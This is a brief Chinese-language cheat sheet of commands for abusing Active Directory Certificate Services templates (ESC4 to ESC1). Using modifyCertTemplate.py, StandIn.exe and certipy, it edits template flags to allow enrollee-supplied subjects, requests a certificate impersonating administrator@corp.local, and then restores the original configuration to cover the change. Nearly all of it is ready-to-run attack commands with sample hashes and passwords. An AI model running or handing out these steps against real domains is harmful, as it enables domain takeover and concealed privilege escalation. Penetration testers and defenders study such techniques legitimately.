	为允许域身份验证的模板启用mspki-certificate-name-flag标志，允许攻击者“将错误配置推送到导致 ESC1 漏洞的模板”
	使用modifyCertTemplate搜索WriteProperty值00000000-0000-0000-0000-000000000000
	https://github.com/fortalice/modifyCertTemplate
	>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl
	添加ENROLLEE_SUPPLIES_SUBJECT（ESS）标志以执行ESC1
	>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag

	C:\>StandIn.exe --adcs --filter WebServer --ess --add
	执行ESC1然后恢复值
	>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
	使用证书
	覆盖配置使其易受 ESC1 攻击
	certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
	根据 ESC4 模板请求证书，就像 ESC1 一样
	certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
	恢复旧配置
	certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
	